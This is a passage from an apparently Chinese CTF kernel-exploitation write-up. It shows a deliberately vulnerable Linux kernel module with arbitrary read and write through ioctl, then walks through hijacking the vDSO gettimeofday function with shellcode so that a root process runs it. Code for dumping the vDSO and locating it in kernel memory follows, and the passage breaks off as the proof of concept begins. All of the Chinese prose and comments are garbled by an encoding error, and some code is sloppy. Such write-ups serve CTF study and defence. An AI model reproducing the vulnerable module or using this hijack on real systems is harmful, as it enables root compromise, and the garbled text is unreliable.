class="line">    <span class="keyword">ssize_t</span> addr;</span><br><span class="line">    <span class="keyword">ssize_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">arbWriteNote</span>* <span class="title">arbNoteObj</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">arbWriteModule_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">arbWriteModule_open</span><span class="params">(struct inode *i, struct file *f)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">arbWriteModule_close</span><span class="params">(struct inode *i, struct file *f)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">arbWriteModule_fops</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">                .owner = THIS_MODULE,</span><br><span class="line">                .open = arbWriteModule_open,</span><br><span class="line">                .release = arbWriteModule_close,</span><br><span class="line">                .unlocked_ioctl = arbWriteModule_ioctl</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾å¤‡é©±åŠ¨æ¨¡å—åŠ è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">arbWriteModule_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module arbWriteModule registered&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (alloc_chrdev_region(&amp;arbWriteModule_dev_no, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;arbWriteModule&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((devClass = class_create(THIS_MODULE, <span class="string">&quot;chardrv&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(arbWriteModule_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (device_create(devClass, <span class="literal">NULL</span>, arbWriteModule_dev_no, <span class="literal">NULL</span>, <span class="string">&quot;arbWriteModule&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[i] Module arbWriteModule error&quot;</span>);</span><br><span class="line">        class_destroy(devClass);</span><br><span class="line">        unregister_chrdev_region(arbWriteModule_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_init(&amp;cdev, &amp;arbWriteModule_fops);</span><br><span class="line">    <span class="keyword">if</span> (cdev_add(&amp;cdev, arbWriteModule_dev_no, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(devClass, arbWriteModule_dev_no);</span><br><span class="line">        class_destroy(devClass);</span><br><span class="line">        unregister_chrdev_region(arbWriteModule_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] &lt;Major, Minor&gt;: &lt;%d, %d&gt;\n&quot;</span>, MAJOR(arbWriteModule_dev_no), MINOR(arbWriteModule_dev_no));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾å¤‡é©±åŠ¨æ¨¡å—å¸è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">arbWriteModule_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// é‡Šæ”¾å ç”¨çš„è®¾å¤‡å·</span></span><br><span class="line">    unregister_chrdev_region(arbWriteModule_dev_no, <span class="number">1</span>);</span><br><span class="line">    cdev_del(&amp;cdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ioctlå‡½æ•°å‘½ä»¤æ§åˆ¶</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">arbWriteModule_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* chunk = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">111</span>: <span class="comment">//arbRead</span></span><br><span class="line">            printk(<span class="string">&quot;Arbitrarily read function!---111\n&quot;</span>);</span><br><span class="line">            arbNoteObj = (struct arbWriteNote*)arg;</span><br><span class="line">            copy_to_user(arbNoteObj-&gt;data,(<span class="keyword">char</span>*)arbNoteObj-&gt;addr,arbNoteObj-&gt;len);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>: <span class="comment">//arbWrite</span></span><br><span class="line">            printk(<span class="string">&quot;Arbitrarily write function!---222\n&quot;</span>);</span><br><span class="line">            arbNoteObj = (struct arbWriteNote*)arg;</span><br><span class="line">            buf = kmalloc(arbNoteObj-&gt;len,GFP_KERNEL);</span><br><span class="line">            copy_from_user(buf,arbNoteObj-&gt;data,arbNoteObj-&gt;len);</span><br><span class="line">            <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)arbNoteObj-&gt;addr,buf,arbNoteObj-&gt;len);</span><br><span class="line">            kfree(buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            retval = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">arbWriteModule_open</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module arbWriteModule: open()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">arbWriteModule_close</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//kfree(buffer_var);</span></span><br><span class="line">    <span class="comment">//buffer_var = NULL;</span></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module arbWriteModule: close()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(arbWriteModule_init);</span><br><span class="line">module_exit(arbWriteModule_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="comment">// MODULE_AUTHOR(&quot;blackndoor&quot;);</span></span><br><span class="line"><span class="comment">// MODULE_DESCRIPTION(&quot;Module vuln overflow&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°ä¼ å…¥ä¸€ä¸ªç»“æ„ä½“ï¼ŒåŒ…å«æ•°æ®æŒ‡é’ˆå’Œåœ°å€ï¼Œç›´æ¥ä»»æ„è¯»å†™ã€‚</p>

        <h2 id="ä¸åŒåŠ«æŒ"   >
          <a href="#ä¸åŒåŠ«æŒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸åŒåŠ«æŒ" class="headerlink" title="ä¸åŒåŠ«æŒ"></a>ä¸åŒåŠ«æŒ</h2>
      
        <h3 id="1-åŠ«æŒvdso"   >
          <a href="#1-åŠ«æŒvdso" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åŠ«æŒvdso" class="headerlink" title="1.åŠ«æŒvdso"></a>1.åŠ«æŒvdso</h3>
      
        <h4 id="1-å‰ç½®çŸ¥è¯†-1"   >
          <a href="#1-å‰ç½®çŸ¥è¯†-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®çŸ¥è¯†-1" class="headerlink" title="(1)å‰ç½®çŸ¥è¯†"></a>(1)å‰ç½®çŸ¥è¯†</h4>
      <p>vdsoçš„ä»£ç æ•°æ®åœ¨å†…æ ¸é‡Œï¼Œå½“ç¨‹åºéœ€è¦ä½¿ç”¨æ—¶ï¼Œä¼šå°†vdsoçš„å†…æ ¸æ˜ å°„ç»™è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæŠŠå†…æ ¸ç©ºé—´çš„vdsoåŸå°ä¸åŠ¨åœ°å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œç„¶åè°ƒç”¨åœ¨ç”¨æˆ·ç©ºé—´çš„vdsoä»£ç ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå°†vdsoç»™åŠ«æŒä¸ºshellcodeï¼Œé‚£ä¹ˆå½“å…·æœ‰rootæƒé™çš„ç¨‹åºè°ƒç”¨vdsoæ—¶ï¼Œå°±ä¼šè§¦å‘æˆ‘ä»¬çš„shellcodeï¼Œè€Œå…·æœ‰rootæƒé™çš„shellcodeå¯æƒ³è€ŒçŸ¥ç›´æ¥å°±å¯ä»¥ã€‚è€Œvdsoæ˜¯ç»å¸¸ä¼šè¢«è°ƒç”¨çš„ï¼Œæ‰€æœ‰åªè¦æˆ‘ä»¬åŠ«æŒäº†vdsoï¼Œå¤§æ¦‚ç‡éƒ½ä¼šè¿è¡Œåˆ°æˆ‘ä»¬çš„shellcodeã€‚</p>
<p>çœŸå®ç¯å¢ƒä¸­crontabä¼šè°ƒç”¨vdsoä¸­çš„gettimeofdayï¼Œä¸”æ˜¯rootæƒé™çš„è°ƒç”¨ã€‚</p>
<p>è€Œctfé¢˜ç›®ä¸­å°±é€šå¸¸å¯ä»¥ç”¨ä¸€ä¸ªå°ç¨‹åºæ¥æ¨¡æ‹Ÿè°ƒç”¨ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;  </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;  </span><br><span class="line">        sleep(<span class="number">1</span>);  </span><br><span class="line">        gettimeofday();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å°†è¿™ä¸ªç¨‹åºç¼–è¯‘åæ”¾åˆ°initä¸­ï¼Œç”¨nohupæŒ‚èµ·ï¼Œå³å¯åšåˆ°rootæƒé™è°ƒç”¨gettimeofdayï¼š</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup /gettimeofday &amp;</span><br></pre></td></tr></table></div></figure>


        <h4 id="2-è·å–åœ°å€"   >
          <a href="#2-è·å–åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è·å–åœ°å€" class="headerlink" title="(2)è·å–åœ°å€"></a>(2)è·å–åœ°å€</h4>
      <p>ç”±äºä¸åŒç‰ˆæœ¬çš„linuxå†…æ ¸ä¸­çš„vdsoåç§»ä¸åŒï¼Œè€Œé¢˜ç›®ç»™çš„vmlinuxé€šå¸¸åˆæ²¡æœ‰ç¬¦å·è¡¨ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªå·±åˆ©ç”¨ä»»æ„è¯»æ¼æ´æ¥æµ‹é‡ã€‚(å¦‚æœé¢˜ç›®æ²¡æœ‰ä»»æ„è¯»æ¼æ´ï¼Œå»ºè®®å¯ä»¥è‡ªå·±ç¼–è¯‘ä¸€ä¸ªå¯¹åº”ç‰ˆæœ¬çš„å†…æ ¸ï¼Œç„¶åè‡ªå·±å†™ä¸€ä¸ªå…·å¤‡ä»»æ„è¯»çš„æ¨¡å—ï¼ŒåŠ è½½ä¹‹åæµ‹é‡å³å¯ï¼Œæˆ–è€…è¿›è¡Œçˆ†ç ´ï¼Œä¸€èˆ¬éœ€è¦çˆ†ç ´ä¸€ä¸ªåŠå­—èŠ‚)</p>
<p>ä¾‹å¦‚è¿™é‡Œç»™å‡ºçš„ä»£ç ç¤ºä¾‹ï¼Œå°±å¯ä»¥é€šè¿‡å¦‚ä¸‹ä»£ç æ¥å°†vdsoä»å†…æ ¸ä¸­dumpä¸‹æ¥ã€‚ä¸è¿‡è¿™ç§æ–¹å¼dumpçš„æ˜¯æ˜ å°„åˆ°ç”¨æˆ·ç¨‹åºçš„vdsoï¼Œè™½ç„¶å†…å®¹æ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡vdsoåœ¨å†…æ ¸ä¸­çš„åç§»å´æ²¡æœ‰åŠæ³•ç¡®å®šã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> test;</span><br><span class="line">    <span class="keyword">size_t</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">    result=memmem(sysinfo_ehdr,<span class="number">0x1000</span>,<span class="string">&quot;gettimeofday&quot;</span>,<span class="number">12</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]VDSO : %p\n&quot;</span>,sysinfo_ehdr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]The offset of gettimeofday is : %x\n&quot;</span>,result-sysinfo_ehdr);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;Wait! %d&quot;</span>, test);  </span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    gdb break point at 0x400A36</span></span><br><span class="line"><span class="comment">    and then dump memory</span></span><br><span class="line"><span class="comment">    why only dump 0x1000 ???</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (sysinfo_ehdr!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>;i+=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(sysinfo_ehdr+i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™ç§æ–¹æ³•çš„åŸç†æ˜¯é€šè¿‡å¯»æ‰¾gettimeofdayå­—ç¬¦ä¸²æ¥å¾—åˆ°æ˜ å°„åˆ°ç¨‹åºä¸­çš„vdsoçš„å†…å­˜é¡µï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150019.png" alt="image-20211020150011934"></p>
<p>ä¹‹åæŠŠä¸‹é¢çš„å†…å®¹éƒ½å¤åˆ¶ï¼Œæ”¾åˆ°CyberChefä¸­ï¼Œåˆ©ç”¨From HexåŠŸèƒ½å¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150220.png" alt="image-20211020150220448"></p>
<p>ç„¶åå°±å°†å¾—åˆ°çš„æ–‡ä»¶æ”¾åˆ°IDAä¸­ï¼Œå³å¯è‡ªåŠ¨è§£æåˆ°å¯¹åº”gettimeofdayå‡½æ•°ç›¸å¯¹äºvdsoçš„å‡½æ•°åç§»ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150335.png" alt="image-20211020150335000"></p>
<p>è¿™é‡Œå°±å½“æ˜¯0xb20ã€‚</p>
<p>ä¹‹åé€šè¿‡ä»»æ„è¯»ï¼Œç±»ä¼¼åŸºäºæœ¬é¢˜ç¼–å†™çš„ä»¥ä¸‹ä»£ç ï¼Œè·å–vdsoç›¸å¯¹äºvmlinuxåŸºå€çš„åç§»ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arbWriteNote</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> addr;</span><br><span class="line">    <span class="keyword">ssize_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arbWriteNote</span> <span class="title">arbWriteObj</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> gettimeofday_str_offset = get_gettimeofday_str_offset();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gettimeofday str in vdso.so offset=0x%x\n&quot;</span>,gettimeofday_str_offset);</span><br><span class="line">    <span class="keyword">size_t</span> vdso_addr = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> addr=<span class="number">0xffffffff80000000</span>;addr &lt; <span class="number">0xffffffffffffefff</span>;addr += <span class="number">0x1000</span>) &#123;</span><br><span class="line">        <span class="comment">//è¯»å–ä¸€é¡µæ•°æ®</span></span><br><span class="line">        arbitrary_read(devFD,<span class="number">0x1000</span>,buf,addr);</span><br><span class="line">        <span class="comment">//å¦‚æœåœ¨å¯¹åº”çš„åç§»å¤„ï¼Œæ­£å¥½æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½ç¡®å®šå½“å‰å°±æ˜¯vdsoçš„åœ°å€</span></span><br><span class="line">        <span class="comment">//ä¹‹æ‰€ä»¥èƒ½ç¡®å®šï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æ¯æ¬¡è¯»å–äº†0x1000å­—èŠ‚æ•°æ®ï¼Œä¹Ÿå°±æ˜¯1é¡µï¼Œè€Œvdsoçš„æ˜ å°„ä¹Ÿåªæ˜¯1é¡µ</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf+gettimeofday_str_offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]find vdso.so!!\n&quot;</span>);</span><br><span class="line">            vdso_addr = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]vdso in kernel addr=0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–vdsoé‡Œçš„å­—ç¬¦ä¸²&quot;gettimeofday&quot;ç›¸å¯¹vdso.soçš„åç§»</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//è·å–å½“å‰ç¨‹åºçš„vdso.soåŠ è½½åœ°å€0x7ffxxxxxxxx</span></span><br><span class="line">    <span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">    <span class="keyword">char</span>* name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!vdso_addr) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ä»…éœ€è¦æœç´¢1é¡µå¤§å°å³å¯ï¼Œå› ä¸ºvdsoæ˜ å°„å°±ä¸€é¡µ0x1000</span></span><br><span class="line">    <span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line">    <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¹‹åå¾—åˆ°å…·ä½“çš„åœ°å€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150724.png" alt="image-20211020150723942"></p>
<p>é‚£ä¹ˆæœ€ç»ˆçš„gettimeofdayç›¸å¯¹äºvmlinuxåŸºåœ°å€å°±æ˜¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gettimeofday_addr = 0xffffffff81e04b20+0xb20</span><br></pre></td></tr></table></div></figure>


        <h4 id="3-ä»»æ„å†™åŠ«æŒgettimeofday"   >
          <a href="#3-ä»»æ„å†™åŠ«æŒgettimeofday" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ä»»æ„å†™åŠ«æŒgettimeofday" class="headerlink" title="(3)ä»»æ„å†™åŠ«æŒgettimeofday"></a>(3)ä»»æ„å†™åŠ«æŒgettimeofday</h4>
      <p>æœ€ç»ˆåˆ©ç”¨ä»»æ„å†™ï¼Œå°†gettimeofdayå‡½æ•°çš„å†…å®¹æ”¹ä¸ºæˆ‘ä»¬çš„shellcodeå³å¯</p>

        <h4 id="POC"   >
          <a href="#POC" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC" class="headerlink" title="POC"></a>POC</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 